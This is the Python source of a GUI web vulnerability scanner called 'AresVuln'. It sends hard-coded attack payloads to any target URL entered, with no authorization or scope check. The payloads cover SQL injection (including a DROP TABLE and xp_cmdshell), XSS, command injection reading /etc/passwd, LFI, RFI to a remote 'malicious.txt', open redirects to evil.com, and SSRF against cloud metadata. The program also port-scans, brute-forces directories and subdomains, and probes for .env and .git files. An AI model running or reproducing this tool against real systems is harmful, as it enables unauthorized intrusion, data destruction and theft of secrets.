import tkinter as tk
from tkinter import scrolledtext, filedialog
import requests
import socket
import threading

# ================== CONFIG ==================
COMMON_PORTS = [21, 22, 80, 443, 3306, 8080, 8443]

SQL_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
    "'; DROP TABLE users--", "' OR 'a'='a", "\" OR \"a\"=\"a",
    "' OR 1=1#", "' OR 1=1/*", "admin'--", "' OR ''='", "' OR 1=1 LIMIT 1--",
    "'; EXEC xp_cmdshell('dir');--", "1 OR 1=1", "' OR SLEEP(5)--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>", "<body onload=alert(1)>",
    "<img src=x onerror=prompt('XSS')>"
]

CMD_INJECTION_PAYLOADS = [
    "; ls", "&& ls", "| ls", "ls", "|| ls",
    "; cat /etc/passwd", "&& cat /etc/passwd", "| cat /etc/passwd",
    "; whoami", "&& whoami"
]

SENSITIVE_FILES = ["/robots.txt", "/.git/", "/.env", "/config.php", "/backup.zip"]
WORDLIST = ["admin", "login", "dashboard", "uploads", "config", "images"]
SUBDOMAINS = ["www", "test", "dev", "staging", "mail", "ftp"]

# Additional Attacks
LFI_PAYLOADS = ["../../etc/passwd", "../../windows/win.ini", "../../boot.ini"]
RFI_PAYLOADS = ["http://example.com/malicious.txt"]
REDIRECT_PAYLOADS = ["http://evil.com", "//evil.com", "/\\evil.com"]
SSRF_PAYLOADS = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254"]

# ================== LOG FUNCTION ==================
def log_message(msg):
    output_area.insert(tk.END, msg + "\n")
    output_area.see(tk.END)

# ================== SCAN FUNCTIONS ==================
def scan_ports(host):
    log_message("\n[+] Scanning Ports...")
    for port in COMMON_PORTS:
        try:
            sock = socket.socket()
            sock.settimeout(1)
            sock.connect((host, port))
            log_message(f"    [OPEN] {port}")
            sock.close()
        except:
            pass

def test_sql_injection(url):
    log_message("\n[+] Testing SQL Injection...")
    for payload in SQL_PAYLOADS:
        try:
            r = requests.get(url + "?id=" + payload, timeout=3)
            if any(err in r.text.lower() for err in ["sql", "mysql", "syntax", "error"]):
                log_message(f"    [VULNERABLE] SQL Injection at {url}?id={payload}")
        except:
            pass

def test_xss(url):
    log_message("\n[+] Testing XSS...")
    for payload in XSS_PAYLOADS:
        try:
            r = requests.get(url + "?q=" + payload, timeout=3)
            if payload in r.text:
                log_message(f"    [VULNERABLE] XSS at {url}?q={payload}")
        except:
            pass

def test_command_injection(url):
    log_message("\n[+] Testing Command Injection...")
    for payload in CMD_INJECTION_PAYLOADS:
        try:
            r = requests.get(url + "?cmd=" + payload, timeout=3)
            if any(word in r.text.lower() for word in ["root", "administrator", "uid"]):
                log_message(f"    [POSSIBLE] Command Injection at {url}?cmd={payload}")
        except:
            pass

def check_sensitive_files(url):
    log_message("\n[+] Checking Sensitive Files...")
    for f in SENSITIVE_FILES:
        try:
            r = requests.get(url + f, timeout=3)
            if r.status_code == 200:
                log_message(f"    [FOUND] {url}{f}")
        except:
            pass

def dir_bruteforce(url):
    log_message("\n[+] Directory Bruteforce...")
    for d in WORDLIST:
        try:
            r = requests.get(url + "/" + d, timeout=3)
            if r.status_code == 200:
                log_message(f"    [FOUND] {url}/{d}")
        except:
            pass

def subdomain_scan(domain):
    log_message("\n[+] Checking Subdomains...")
    for sub in SUBDOMAINS:
        subdomain = f"http://{sub}.{domain}"
        try:
            r = requests.get(subdomain, timeout=3)
            if r.status_code < 400:
                log_message(f"    [ACTIVE] {subdomain}")
        except:
            pass

# ================== NEW ATTACKS ==================
def test_lfi(url):
    log_message("\n[+] Testing Local File Inclusion (LFI)...")
    for payload in LFI_PAYLOADS:
        try:
            r = requests.get(url + "?file=" + payload, timeout=3)
            if "root:" in r.text or "[extensions]" in r.text:
                log_message(f"    [VULNERABLE] LFI at {url}?file={payload}")
        except:
            pass

def test_rfi(url):
    log_message("\n[+] Testing Remote File Inclusion (RFI)...")
    for payload in RFI_PAYLOADS:
        try:
            r = requests.get(url + "?file=" + payload, timeout=3)
            if "Warning" in r.text or "failed" in r.text:
                log_message(f"    [POSSIBLE] RFI at {url}?file={payload}")
        except:
            pass

def test_open_redirect(url):
    log_message("\n[+] Testing Open Redirect...")
    for payload in REDIRECT_PAYLOADS:
        try:
            r = requests.get(url + "?next=" + payload, timeout=3, allow_redirects=False)
            if r.status_code in [301,302] and payload in r.headers.get("Location",""):
                log_message(f"    [VULNERABLE] Open Redirect at {url}?next={payload}")
        except:
            pass

def test_ssrf(url):
    log_message("\n[+] Testing SSRF...")
    for payload in SSRF_PAYLOADS:
        try:
            r = requests.get(url + "?url=" + payload, timeout=3)
            if "root" in r.text or r.status_code == 200:
                log_message(f"    [POSSIBLE] SSRF at {url}?url={payload}")
        except:
            pass

# ================== MAIN SCAN WRAPPER ==================
def start_scan():
    target = url_entry.get().strip()
    if not target.startswith("http"):
        target = "http://" + target
    host = target.replace("http://", "").replace("https://", "").split("/")[0]
    log_message(f"\n=== Scanning Target: {target} ===")
    threading.Thread(target=run_scans, args=(target, host), daemon=True).start()

def run_scans(target, host):
    scan_ports(host)
    test_sql_injection(target)
    test_xss(target)
    test_command_injection(target)
    check_sensitive_files(target)
    dir_bruteforce(target)
    subdomain_scan(host)
    # New attacks
    test_lfi(target)
    test_rfi(target)
    test_open_redirect(target)
    test_ssrf(target)
    log_message("\n[+] Scan Complete!")

# ================== EXPORT REPORT ==================
def export_report():
    report_text = output_area.get("1.0", tk.END)
    if not report_text.strip():
        log_message("\n[!] No results to export!")
        return
    file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                             filetypes=[("Text Files", "*.txt")],
                                             title="Save Report As")
    if file_path:
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(report_text)
        log_message(f"\n[+] Report saved as {file_path}")

# ================== CLEAR TERMINAL ==================
def clear_terminal():
    output_area.delete("1.0", tk.END)

# ================== HACKER BUTTON CREATOR ==================
def create_hacker_button(parent, text, command):
    btn = tk.Button(parent, text=text, font=("VT323", 12, "bold"),
                    bg="black", fg="#11FFC0",
                    activebackground="#00FFB7", activeforeground="black",
                    relief=tk.FLAT, bd=2, highlightthickness=2, highlightbackground="#11FFC0",
                    cursor="hand2", padx=20, pady=8, command=command)
    # Hover effect
    def on_enter(e):
        btn.config(bg="#11FFC0", fg="black")
    def on_leave(e):
        btn.config(bg="black", fg="#11FFC0")
    btn.bind("<Enter>", on_enter)
    btn.bind("<Leave>", on_leave)
    return btn

# ================== GUI ==================
root = tk.Tk()
root.title("AresVuln")
root.geometry("950x750")
root.configure(bg="black")

TERMINAL_FONT = ("VT323", 12)

# URL Entry
url_label = tk.Label(root, text="Target URL:", font=TERMINAL_FONT, bg="black", fg="#11FFC0")
url_label.pack(pady=5)

url_entry = tk.Entry(root, font=TERMINAL_FONT, width=50, bg="black", fg="#11FFC0", insertbackground="#11FFC0")
url_entry.pack(pady=5)

# Buttons
btn_frame = tk.Frame(root, bg="black")
btn_frame.pack(pady=10)

scan_btn = create_hacker_button(btn_frame, "Start Scan", start_scan)
scan_btn.grid(row=0, column=0, padx=10)

export_btn = create_hacker_button(btn_frame, "Export Report", export_report)
export_btn.grid(row=0, column=1, padx=10)

clear_btn = create_hacker_button(btn_frame, "Clear Terminal", clear_terminal)
clear_btn.grid(row=0, column=2, padx=10)

# Output Area
output_area = scrolledtext.ScrolledText(root, font=TERMINAL_FONT, width=110, height=35,
                                        bg="black", fg="#11FFC0", insertbackground="#11FFC0")
output_area.pack(pady=10)

# Footer
footer = tk.Label(root, text="WOC SCANNER", font=("VT323", 24, "bold"), bg="black", fg="#11FFC0")
footer.pack(side=tk.BOTTOM, pady=10)

# Blinking Cursor
def blink_cursor():
    current = output_area.get("end-2c")
    if current.endswith("|"):
        output_area.delete("end-2c")
    else:
        output_area.insert(tk.END, "|")
    output_area.see(tk.END)
    root.after(500, blink_cursor)

blink_cursor()
root.mainloop()